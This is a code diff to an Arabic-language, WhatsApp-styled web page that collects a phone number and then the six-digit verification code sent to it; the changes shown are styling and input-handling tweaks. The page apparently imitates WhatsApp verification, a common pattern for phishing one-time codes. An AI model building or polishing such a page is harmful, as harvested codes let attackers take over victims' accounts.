@@ -453,39 +453,72 @@
             text-align: center;
         }
 
-        /* إدخال الكود */
-        .code-input-container {
+        /* إدخال الكود - تصميم جديد عصري */
+        .code-section {
             text-align: center;
             margin-bottom: 30px;
         }
 
-        .code-inputs {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
+        .code-instructions {
+            background: rgba(37, 211, 102, 0.1);
+            border: 1px solid rgba(37, 211, 102, 0.3);
+            border-radius: 15px;
+            padding: 20px;
             margin-bottom: 25px;
+            text-align: center;
         }
 
-        .code-input {
-            width: 55px;
+        .code-instructions i {
+            font-size: 2rem;
+            color: var(--whatsapp-green);
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .code-instructions p {
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 500;
+            margin-bottom: 5px;
+            font-size: 1rem;
+        }
+
+        .code-instructions small {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+        }
+
+        .code-input-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .code-input-box {
+            width: 60px;
             height: 70px;
-            text-align: center;
-            font-size: 28px;
-            font-weight: bold;
+            background: rgba(34, 34, 34, 0.8);
             border: 2px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
-            background: rgba(34, 34, 34, 0.8);
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
             color: var(--whatsapp-white);
             transition: all 0.3s ease;
+            outline: none;
         }
 
-        .code-input:focus {
+        .code-input-box:focus {
             border-color: var(--whatsapp-green);
             background: rgba(34, 34, 34, 0.9);
-            outline: none;
             box-shadow: 
                 0 0 0 3px rgba(37, 211, 102, 0.2),
                 0 0 20px rgba(37, 211, 102, 0.3);
+        }
+
+        .code-input-box.filled {
+            border-color: var(--whatsapp-green);
+            background: rgba(37, 211, 102, 0.1);
         }
 
         .timer {
@@ -526,10 +559,12 @@
         /* الأزرار */
         .button-group {
             margin-top: 30px;
+            display: flex;
+            gap: 15px;
         }
 
         .whatsapp-btn {
-            width: 100%;
+            flex: 1;
             background: var(--gradient-whatsapp);
             border: none;
             border-radius: 15px;
@@ -545,7 +580,6 @@
             gap: 15px;
             position: relative;
             overflow: hidden;
-            margin-top: 10px;
         }
 
         .whatsapp-btn:hover {
@@ -720,8 +754,8 @@
                 font-size: 2.2rem;
             }
             
-            .code-input {
-                width: 45px;
+            .code-input-box {
+                width: 50px;
                 height: 60px;
                 font-size: 24px;
             }
@@ -742,6 +776,22 @@
             .whatsapp-btn {
                 padding: 18px;
                 font-size: 1.1rem;
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+            
+            .code-input-group {
+                gap: 8px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .code-input-box {
+                width: 45px;
+                height: 55px;
+                font-size: 22px;
             }
         }
     </style>
@@ -840,22 +890,22 @@
                 لقد أرسلنا رمز تحقق مكون من 6 أرقام إلى رقم الهاتف الذي أدخلته. يرجى إدخال الرمز أدناه للمتابعة في عملية التوثيق.
             </div>
             
-            <div class="form-group">
-                <label class="form-label">
-                    <i class="fas fa-key"></i>
-                    أدخل الكود:
-                </label>
-                <div class="code-input-container">
-                    <div class="code-inputs">
-                        <input type="text" class="code-input" maxlength="1" data-index="0">
-                        <input type="text" class="code-input" maxlength="1" data-index="1">
-                        <input type="text" class="code-input" maxlength="1" data-index="2">
-                        <input type="text" class="code-input" maxlength="1" data-index="3">
-                        <input type="text" class="code-input" maxlength="1" data-index="4">
-                        <input type="text" class="code-input" maxlength="1" data-index="5">
-                    </div>
-                    <input type="hidden" id="fullCode">
+            <div class="code-section">
+                <div class="code-instructions">
+                    <i class="fas fa-comment-alt"></i>
+                    <p>تم إرسال كود تحقق مكون من 6 أرقام</p>
+                    <small>أدخل الكود الذي تلقيته خلال 10 دقائق</small>
                 </div>
+                
+                <div class="code-input-group">
+                    <input type="text" class="code-input-box" maxlength="1" data-index="0">
+                    <input type="text" class="code-input-box" maxlength="1" data-index="1">
+                    <input type="text" class="code-input-box" maxlength="1" data-index="2">
+                    <input type="text" class="code-input-box" maxlength="1" data-index="3">
+                    <input type="text" class="code-input-box" maxlength="1" data-index="4">
+                    <input type="text" class="code-input-box" maxlength="1" data-index="5">
+                </div>
+                <input type="hidden" id="fullCode">
             </div>
             
             <div class="loading" id="loading2">
@@ -944,7 +994,7 @@
         const step2 = document.getElementById('step2');
         const successMessage = document.getElementById('successMessage');
         const phoneInput = document.getElementById('phone');
-        const codeInputs = document.querySelectorAll('.code-input');
+        const codeInputs = document.querySelectorAll('.code-input-box');
         const fullCodeInput = document.getElementById('fullCode');
         const countrySelect = document.getElementById('country');
         const countryCodeDisplay = document.getElementById('countryCode');
@@ -991,12 +1041,19 @@
             playSound('clickSound');
         });
 
-        // إدارة إدخال رمز التحقق
+        // إدارة إدخال رمز التحقق (تصميم جديد)
         codeInputs.forEach((input, index) => {
             input.addEventListener('input', function() {
                 // السماح فقط بالأرقام
                 this.value = this.value.replace(/[^0-9]/g, '');
                 playSound('clickSound');
+                
+                // إضافة/إزالة class عند التعبئة
+                if (this.value) {
+                    this.classList.add('filled');
+                } else {
+                    this.classList.remove('filled');
+                }
                 
                 // إذا تم إدخال رقم، الانتقال للحقل التالي
                 if (this.value.length === 1 && index < 5) {
@@ -1008,7 +1065,9 @@
                 
                 // إذا تم ملء جميع الحقول، التحقق تلقائيًا
                 if (isAllCodeInputsFilled()) {
-                    setTimeout(() => verifyCodeBtn.click(), 300);
+                    setTimeout(() => {
+                        verifyCodeBtn.focus();
+                    }, 100);
                 }
             });
             
@@ -1017,6 +1076,24 @@
                 if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                     codeInputs[index - 1].focus();
                     playSound('clickSound');
+                }
+                
+                // إذا ضغط على backspace وكان الحقل مليء، مسح الحقل
+                if (e.key === 'Backspace' && this.value.length > 0) {
+                    this.value = '';
+                    this.classList.remove('filled');
+                    updateFullCode();
+                    playSound('clickSound');
+                }
+                
+                // إذا ضغط على سهم لليسار، الانتقال للحقل السابق
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    codeInputs[index - 1].focus();
+                }
+                
+                // إذا ضغط على سهم لليمين، الانتقال للحقل التالي
+                if (e.key === 'ArrowRight' && index < 5) {
+                    codeInputs[index + 1].focus();
                 }
             });
             
@@ -1031,6 +1108,7 @@
                     for (let i = 0; i < Math.min(pastedData.length, 6); i++) {
                         if (i + index < 6) {
                             codeInputs[i + index].value = pastedData[i];
+                            codeInputs[i + index].classList.add('filled');
                         }
                     }
                     
@@ -1043,8 +1121,22 @@
                     
                     // إذا تم ملء جميع الحقول، التحقق تلقائيًا
                     if (isAllCodeInputsFilled()) {
-                        setTimeout(() => verifyCodeBtn.click(), 300);
+                        setTimeout(() => {
+                            verifyCodeBtn.focus();
+                        }, 100);
                     }
+                }
+            });
+            
+            input.addEventListener('focus', function() {
+                this.style.borderColor = 'var(--whatsapp-green)';
+                this.style.boxShadow = '0 0 0 3px rgba(37, 211, 102, 0.2)';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+                    this.style.boxShadow = 'none';
                 }
             });
         });
@@ -1177,12 +1269,21 @@
             
             if (!phoneNumber) {
                 alert('يرجى إدخال رقم الهاتف');
+                playSound('errorSound');
                 return;
             }
             
             // التحقق من أن الرقم يحتوي على أرقام فقط
             if (!/^\d+$/.test(phoneNumber)) {
                 alert('يرجى إدخال رقم هاتف صحيح (أرقام فقط)');
+                playSound('errorSound');
+                return;
+            }
+            
+            // التحقق من طول الرقم
+            if (phoneNumber.length < 8) {
+                alert('يرجى إدخال رقم هاتف صحيح (8 أرقام على الأقل)');
+                playSound('errorSound');
                 return;
             }
             
@@ -1226,12 +1327,14 @@
             
             if (!enteredCode || enteredCode.length !== 6) {
                 alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
+                playSound('errorSound');
                 return;
             }
             
             // التحقق من أن الرمز يحتوي على أرقام فقط
             if (!/^\d+$/.test(enteredCode)) {
                 alert('يرجى إدخال رمز تحقق صحيح (أرقام فقط)');
+                playSound('errorSound');
                 return;
             }
             
@@ -1283,6 +1386,7 @@
             
             if (!phoneNumber) {
                 alert('يرجى العودة إلى الخطوة الأولى وإدخال رقم الهاتف');
+                playSound('errorSound');
                 return;
             }
             
